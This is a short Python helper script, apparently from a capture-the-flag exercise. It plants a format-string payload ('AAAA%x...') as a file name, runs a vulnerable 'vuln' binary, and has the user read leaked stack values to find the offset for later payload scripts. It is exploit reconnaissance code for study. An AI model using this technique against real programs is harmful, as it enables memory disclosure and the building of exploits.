#!/usr/bin/env python3
"""
Offset Finder: Determine where the buffer appears on printf's stack.

Creates a directory with vuln and a .txt file named:
  AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.txt

Look for 41414141 in the output — its position is the stack offset.

Usage:
  python3 find_offset.py
"""
import os
import sys
import shutil

TASK_DIR = "find_offset"
VULN     = "vuln"
FLAGFILE = "flag.txt"

# Create fresh directory
if os.path.exists(TASK_DIR):
    shutil.rmtree(TASK_DIR)
os.makedirs(TASK_DIR)

# Copy vuln only (we don't want flag.txt competing)
shutil.copy2(VULN, TASK_DIR)
os.chmod(os.path.join(TASK_DIR, VULN), 0o755)

# Create test .txt file: AAAA followed by %x specifiers
test_filename = b"AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.txt"
filepath = os.path.join(TASK_DIR.encode(), test_filename)
with open(filepath, "wb") as f:
    f.write(b"test content\n")

print(f"[+] Created {TASK_DIR}/ with vuln and test .txt file")
print(f"[*] Running ./vuln ...")
print("=" * 50)

os.chdir(TASK_DIR)
os.system(f"./{VULN}")

print("=" * 50)
print("[*] Look for '41414141' in the output above")
print("[*] Count its position (1-indexed) among the hex values")
print("[*] That number is the OFFSET to use in payloadCreate scripts")
